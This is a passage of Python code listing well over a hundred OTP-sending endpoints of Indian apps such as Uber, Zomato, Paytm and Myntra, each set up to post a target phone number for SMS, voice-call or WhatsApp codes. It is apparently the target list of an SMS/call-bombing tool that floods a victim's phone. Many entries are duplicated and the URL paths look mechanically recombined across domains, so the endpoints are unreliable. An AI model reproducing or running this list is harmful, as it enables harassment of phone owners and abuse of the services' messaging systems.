    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Khatabook Call', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Ajio Call', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
